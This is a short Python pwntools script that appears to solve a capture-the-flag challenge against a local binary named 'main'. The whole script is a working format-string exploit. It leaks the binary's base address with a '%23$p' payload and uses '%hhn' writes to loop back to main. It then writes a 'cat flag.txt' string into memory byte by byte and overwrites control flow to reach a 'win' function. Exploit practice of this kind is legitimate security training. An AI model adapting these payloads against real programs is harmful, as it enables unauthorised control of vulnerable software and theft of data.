from pwn import *

elf = context.binary = ELF("./main")
#context.log_level = 'debug'
io = process('./main')

# Leak base address
io.sendlineafter(b"first name: ", b"%23$p")
io.recvuntil(b"You entered ")
leaks = io.recvline().strip()
base_addr = int(leaks,16) - 0x0000147b
elf.address = base_addr

# ret2main
main_last_byte = 0x7b
payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
io.sendline(payload)

# write shellcode
command = b'#!/bin/cat flag.txt'
buffer = elf.address + 0x4040
for i in range(len(command)):
    io.recvuntil(b'first name')

    payload = f"%{main_last_byte}c%7$hhn".encode().ljust(16,b"\x00")
    payload += p64(buffer+i)
    io.sendline(payload)
    payload = b'%' + f"{command[i]}".encode() + b'c'
    payload += b'%10$hhn'
    io.sendline(payload)

# ret2win
io.recvuntil(b'first name: ')
win_bytes = elf.sym.win & 0xFFFF
payload = f"%{win_bytes}c%7$hn".encode()
io.sendline(payload)
io.interactive()
